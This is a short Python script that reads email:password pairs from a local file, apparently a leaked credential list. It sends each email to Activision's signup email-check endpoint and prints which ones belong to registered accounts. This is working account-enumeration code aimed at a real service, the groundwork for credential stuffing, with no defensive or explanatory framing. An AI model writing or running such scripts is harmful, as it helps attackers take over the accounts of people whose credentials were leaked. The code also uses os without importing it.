import requests

all_emails_file =  open(os.path.dirname(os.path.realpath(__file__)) + '/all_emails.txt', 'r')

for line in all_emails_file:
    full_line = line.strip()
    if full_line == '':
        continue

    splited_full_line = full_line.split(':')
    username = splited_full_line[0]
    pasword = splited_full_line[1]

    url = 'https://s.activision.com/activision/signup/checkEmail'
    params = {
        'email': username
    }

    response = requests.post(url, params=params)
    #print(response.url)
    if response.status_code != 200:
        print('failed, status:', response.text)
    else:
        json_response = response.json()

        if json_response['status'] == 'valid':
            print(json_response['status'])
            #with open(os.path.dirname(os.path.realpath(__file__)) + '/valid_emails.txt', 'a') as valid_emails_file:
            #    valid_emails_file.write(email_line)

